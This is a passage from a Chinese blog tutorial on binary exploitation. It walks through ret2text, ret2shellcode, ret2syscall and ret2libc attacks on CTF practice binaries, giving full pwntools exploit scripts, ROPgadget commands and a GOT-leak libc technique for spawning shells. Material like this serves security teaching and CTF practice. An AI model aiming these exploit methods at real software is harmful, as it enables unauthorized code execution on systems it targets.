class="string">&#x27;协议&#x27;</span>) <span class="comment">#第三个参数可选</span></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x0804863A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">或：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target=<span class="number">0x0804863A</span></span><br><span class="line"><span class="comment">#即/bin/sh所在位置</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(target))</span><br><span class="line"><span class="comment">#至此就获得了系统权限</span></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#打开交互页面</span></span><br></pre></td></tr></table></figure>

<p>学习一下那些字母前缀的作用</p>
<table>
<thead>
<tr>
<th align="center">字母</th>
<th align="center">例子</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">u</td>
<td align="center">u”我是含有中文字符组成的字符串。”</td>
<td align="center">字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">response = b’Hello World!’ 。 b’ ‘ 表示这是一个 bytes 对象</td>
<td align="center">b” “前缀表示：后面字符串是bytes 类型。网络编程中，服务器和浏览器只认bytes 类型数据。如：send 函数的参数和 recv 函数的返回值都是 bytes 类型。</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">r”\n\t\n\t”</td>
<td align="center">去掉反斜杠的转移机制，而不表示换行。常用于正则表达式，对应着re模块</td>
</tr>
<tr>
<td align="center">f</td>
<td align="center">name = ‘Joy’<br />&gt;&gt;print(name is’{name}’)<br />&gt;&gt;&gt;name is Joy</td>
<td align="center">f 开头表示在字符串内支持大括号内的python 表达式</td>
</tr>
</tbody></table>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>代码执行我们的二进制代码</p>
<p> 1.首先使用 checksec 检查文件，32位程序，几乎没有做防护</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/20.png">    </p>
<p>2.拖入32位ida中，查看反编译后的main函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/21.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  strncpy(buf2, s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure>

<p>我们发现了gets()函数，该函数不检查输入而是根据回车判断的，存在溢出。同时发现有<code>strncpy(buf2, s, 0x64u)</code>将s复制到了<code>buf2</code>中，双击<code>buf2</code>可以看到位于<code>.bss</code>段中，地址为<code>0x0804A080</code></p>
<blockquote>
<p>bss段属于静态内存分配。 bss是英文Block Started by Symbol的简称。<br>BSS段通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是<code>可读写</code>的，在程序执行之前BSS段会自动清0，所以，未初始的全局变量在程序执行之前已经成0了。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/22.png"></p>
<p>3.使用gdb确认该段的可读写性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2shellcode	#使用gdb</span><br><span class="line">b main				#在main下断点</span><br><span class="line">r					#运行程序</span><br><span class="line">vmmap			#查看栈、bss段是否可以执行</span><br></pre></td></tr></table></figure>

<p>可以看到<code>0x0804a000 0x0804b000 rwxp    /home/mtrleed/桌面/1/ret2shellcode</code>这是具有可读写性的，而<code>0x0804A080</code>也在该段内</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/23.png"></p>
<p>4.使用cyclic生成字符填充，查看溢出位置为<code>0x62616164</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/24.png"></p>
<p>得到112，然后开始写exp，其中 shellcode 可以由 pwntools 生成</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/25.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"><span class="comment">#由pwntools生成shellcode，然后通过asm转换成字节码</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ljust是向左对齐填充字节，这里是将shellcode填充完后，不足112长度的地方用a来填充</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行之后获得交互式shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/26.png"></p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>简单来说就是控制程序执行系统调用获取 shell</p>
<p>1.使用checksec查看信息，32位程序，开启了XN，是不能执行shellcode的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/27.png"></p>
<p>2.拖入32位ida查看main函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典的gets()溢出漏洞</p>
<p>2.由于我们不能像之前一样直接利用程序中的某段代码或者自己填写代码拿到shell，所以需要利用程序中的 gadgets 来获得 shell<br>首先我们需要了解一下 Linux 的系统调用知识点：     </p>
<blockquote>
<p>Linux的系统调用通过 int 80h 实现，并且用系统调用号来区分入口的函数</p>
<p>调用流程如下：<br>1、将系统调用编号存入 eax 寄存器中<br>2、将函数的参数存入其他通用的寄存器（ebx、ecx、edx…）<br>2、触发 0x80 号中断</p>
</blockquote>
<p>比如我们通过系统调用执行：<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/28.png"></p>
<p>3.使用cyclic计算偏移量为112</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/29.png"></p>
<p>4.系统调用号可以在线<code>https://syscalls.w3challs.com/</code>查看</p>
<blockquote>
<p>其中，该程序是 32 位，所以我们需要使得</p>
<p>系统调用号，即 eax 应该为 0xb<br>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。<br>第二个参数，即 ecx 应该为 0<br>第三个参数，即 edx 应该为 0</p>
</blockquote>
<p>32位系统为11(0xb)，64位系统为59(0x3b)</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/30.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/31.png"></p>
<p>接着我们使用 <strong>ROPgadget</strong> 工具开始寻找含有<code>pop eax</code>的指令地址，这里的都可以选这里我们选第二个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/32.png"></p>
<p>接着寻找<code>pop ebx</code>的指令地址，可以发现在找<code>pop ebx</code>的过程中发现这个地址同时包含控制 ecx、edx 的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/33.png"></p>
<p>接着寻找<code>/bin/sh</code>的地址，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/34.png"></p>
<p>还要找最后一个<code>int 80h</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/35.png"></p>
<p>现在地址都找齐了，就可以开始写exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line"><span class="comment">#这里需要按照pop_edx_ecx_ebx的操作顺序来写，所以bin_sh在两个0后面</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) + p32(int_80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行exp获得交互式shell    <img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/36.png"></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>ret2libc 简单来说就是使我们的 ret 不跳转到 vuln 或者 shellcode 上，而是跳转到了某个函数的 plt 或者该函数对应的 got 表内容，从而控制函数去执行 libc 中的函数，一般情况下使用<code>system(&quot;/bin/sh&quot;)</code><br>在 wiki 中，一共给了三道题，分别对应不同情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、有system 有/bin/sh</span><br><span class="line">2、有system 无/bin/sh</span><br><span class="line">3、无system 无/bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="有system有-bin-sh"><a href="#有system有-bin-sh" class="headerlink" title="有system有/bin/sh"></a>有system有/bin/sh</h4><p>首先是<code>ret2libc1</code></p>
<p><code>checksec</code> 检查一下文件，该文件为32位，开启了<code>RELRO</code>和<code>NX</code>保护</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/46.png"></p>
<p>32为IDA打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经典<code>gets()</code>栈溢出漏洞</p>
<p>发现存在<code>system</code>函数，地址是<code>0x08048460</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/47.png"></p>
<p>使用工具<code>ROPgadget</code>查找是否存在<code> /bin/sh</code> 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/48.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/60.png"></p>
<p>存在<code>/bin/sh</code></p>
<p>都找到地址后，开始计算溢出的偏移地址</p>
<p>老样子，使用<code>cyclic</code>生成<code>200</code>个字符，让程序运行报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/49.png"></p>
<p>计算偏移为<code>112</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/50.png"></p>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_a = <span class="number">0x08048460</span></span><br><span class="line">bin_sh_a = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment">#因为是调用system函数，所以需要给一个返回地址，我们随意写一个虚假的地址即可</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_a) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(bin_sh_a) <span class="comment">#python3 要在&#x27;a&#x27;和&#x27;b&#x27;前加个b，表示转换为byte类型</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/51.png">    </p>
<p>成功获得<code>shell</code></p>
<h4 id="有system-无-bin-sh"><a href="#有system-无-bin-sh" class="headerlink" title="有system 无/bin/sh"></a>有system 无/bin/sh</h4><p><code>checksec</code>检查文件，32位开启NX保护，不能执行<code>shellcode</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/52.png"></p>
<p><code>IDA</code>查看文件内容，还是<code>gets()</code>栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;Something surprise here, but I don&#x27;t think it will work.&quot;);</span><br><span class="line">  printf(&quot;What do you think ?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在<code>system</code>函数地址为<code>0x08048490</code>，但是不存在<code>/bin/sh</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/53.png"></p>
<p>但是<code>main</code>函数中存在<code>gets</code>且<code>plt</code>表中也存在<code>gets</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/54.png">    </p>
<p>所以思路就是，如果 bss 段可写，我们就通过 gets 接收我们输入的<code>/bin/sh</code>字符串，然后写入到 bss 段中，接着跳转到 system 函数中执行，整个流程图如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/55.png"></p>
<p>我们先去看一下 bss 段地址，是否有写权限，从<code>0804A040</code>开始</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/56.png"></p>
<p>gdb：b main 打断点-&gt;r 运行 -&gt; vmmap查看各段权限。可以看到bss段有写权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/57.png"></p>
<p>由之前的方法算出栈空间大小为112，可以写exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#因为/bin/sh是写到bss段中，所以地址一样</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(get_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>获得shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/58.png"></p>
<h4 id="无system-无-bin-sh"><a href="#无system-无-bin-sh" class="headerlink" title="无system 无/bin/sh"></a>无system 无/bin/sh</h4><p><code>checksec</code>检查文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/59.png"></p>
<p>IDA打开文件，shift+F12查看字符串，没有发现system和/bin/sh</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/61.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样是<code>gets()</code>栈溢出</p>
<p>没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址</p>
<p>获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址，执行过一遍的地址才能确认</p>
<p>总的来说：</p>
<p>1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以）</p>
<p>2、将 puts 的返回地址设置为 start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’)</p>
<p>3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址</p>
<p>4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"><span class="comment">#从程序中获取puts的plt和got以及_start地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="comment">#第一次栈溢出，puts函数输出puts_got，即got的地址</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#使用题目的libc</span></span><br><span class="line">libc = elf.libc</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#第二次栈溢出，执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行获得shell。python3报错太多，最终使用python3执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/62.png"></p>
<p>上面说的都是<code>32位程序</code>，而在64位程序中函数的调用栈是不同的，这也是我们写 payload 时需要注意的地方</p>
<blockquote>
<ul>
<li>32位程序<ul>
<li><strong>函数参数</strong> 在 <strong>函数返回地址</strong> 的上方</li>
</ul>
</li>
<li>64位程序<ul>
<li>采用寄存器传参，所以我们需要覆盖寄存器</li>
<li>前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，参数超过六个时，从第七个开始压入栈中</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF， <strong>6 个字节长度</strong> ，否则会抛出异常。</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="ret2csu（中级ROP-64位）"><a href="#ret2csu（中级ROP-64位）" class="headerlink" title="ret2csu（中级ROP 64位）"></a>ret2csu（中级ROP 64位）</h3><p>未完待续。。。。。。。佛系更新</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MTRleed</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mtrleed.top/post/13/">https://www.mtrleed.top/post/13/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mtrleed.top" target="_blank">MTRleed</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/2023/pwn/ico.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/16/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/curl-CVE-2023-38545/curl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">curl缓冲区溢出</div></div></a></div><div class="next-post pull-right"><a href="/post/15/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2023/springboot-jolokia-RCE/springboot-ico.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">springboot-jolokia-RCE</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">2.1.</span> <span class="toc-text">定义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">寄存器：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E7%AB%AF"><span class="toc-number">3.2.</span> <span class="toc-text">大小端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88"><span class="toc-number">3.3.</span> <span class="toc-text">栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">3.4.</span> <span class="toc-text">函数调用栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 